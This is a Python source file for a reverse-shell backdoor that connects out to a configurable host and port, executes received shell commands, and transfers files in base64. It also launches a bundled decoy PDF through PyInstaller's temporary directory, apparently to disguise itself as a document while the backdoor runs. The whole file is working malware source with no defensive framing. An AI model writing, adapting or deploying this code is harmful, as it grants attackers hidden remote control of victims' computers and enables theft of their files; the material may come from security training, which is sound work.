#!/usr/bin/env python

import socket
import subprocess
import os
import json
import optparse
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip="127.0.0.1", port=44444):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def change_workdir_to(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError as e:
                print(f"\n[+] DEBUG: ValueError {e}\n")
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Upload successful"

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit(0)
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_workdir_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception as e:
                print(f"[-] Error during command execution: {e}")
            self.reliable_send(command_result)


parser = optparse.OptionParser()
parser.add_option("--ip", dest="ip", default="127.0.0.1", help="IP to connect to")
parser.add_option("--port", dest="port", default=44444, help="Port to connect to")
(options, arguments) = parser.parse_args()

file_name = sys._MEIPASS + "/sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor(options.ip, options.port)
    my_backdoor.run()
except Exception:
    sys.exit()
